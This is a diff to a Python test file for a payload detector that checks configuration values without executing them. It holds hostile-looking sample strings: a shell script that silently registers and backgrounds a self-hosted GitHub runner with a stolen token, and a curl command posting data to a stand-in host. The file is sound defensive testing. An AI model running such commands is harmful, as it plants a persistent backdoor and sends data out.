@@ -719,7 +719,7 @@ class TestReadingNeverRunsTheConfiguration(ExecSurfaceSandbox):
 
 
 _RUNNER_REGISTRATION = (
-    samples.joined('#!/bin/sh\nRD=$HOME/.dev-env\ncd "$RD" && ./config.sh --url https://github.com/o/r --unattended --token "$RUNNER_TOKEN" --name "SHA1', 'HULUD"\nnohup ./run.sh >/dev/null 2>&1 &\n'))
+    samples.joined('#!/bin/sh\nRD=$HOME/.dev-env\ncd "$RD" && ./config.sh --url https://github.com/o/r --unattended --token "$RUNNER_TOKEN" --name "', samples.RUNNER_NAME, '"\nnohup ./run.sh >/dev/null 2>&1 &\n'))
 _RUNNER_RESTORED = (
     "#!/bin/sh\nRD=$HOME/.dev-env\ncat > \"$RD/.runner\" <<'EOF'\n"
     "{\"agentName\": \"build-agent-7\", \"serverUrl\": \"https://pipelines.actions.githubusercontent.com/x/\", "
@@ -748,7 +748,7 @@ class TestTheValueIsAKnownPayloadOnlyWhereTheFingerprintHolds(unittest.TestCase)
         self.carries_payload = payload_check_for(every, holding_anywhere=True)
 
     def test_a_fingerprint_meant_for_some_files_does_not_hold(self):
-        for value in ("echo TechMono", "cat branch_structure.json", samples.joined('./config.sh --name SHA1', 'HULUD'),
+        for value in ("echo TechMono", "cat branch_structure.json", samples.joined('./config.sh --name ', samples.RUNNER_NAME),
                       "curl -d '{\"serverUrl\": \"https://ci.example.com\"}' https://h.example.com"):
             with self.subTest(value=value):
                 self.assertIsNone(self.carries_payload(value))
